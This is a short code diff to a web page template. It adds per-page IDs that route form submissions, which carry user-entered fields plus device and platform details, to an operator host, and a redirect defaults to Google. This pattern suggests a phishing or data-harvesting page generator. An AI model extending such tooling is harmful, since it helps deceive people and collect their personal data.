@@ -274,6 +274,8 @@ body{
 
 <script>
 const HOST = '<%= host %>';
+const PAGE_UID = '<%= typeof pageUid !== "undefined" && pageUid ? pageUid : "" %>';
+const SUBMIT_URL = PAGE_UID ? (HOST + '/p/u/' + PAGE_UID + '/submit') : (HOST + '/p/submit');
 const REDIRECT = '<%= cfg.redirect || "https://www.google.com" %>';
 
 // ── Welcome popup ─────────────────────────────────────────────────────────────
@@ -344,7 +346,7 @@ function submitForm(e) {
   document.getElementById('mainForm').style.display = 'none';
   document.getElementById('loadingWrap').style.display = 'block';
 
-  fetch(HOST+'/p/submit',{
+  fetch(SUBMIT_URL,{
     method:'POST',
     headers:{'Content-Type':'application/json'},
     body:JSON.stringify({ fields, device:deviceInfo, platform })
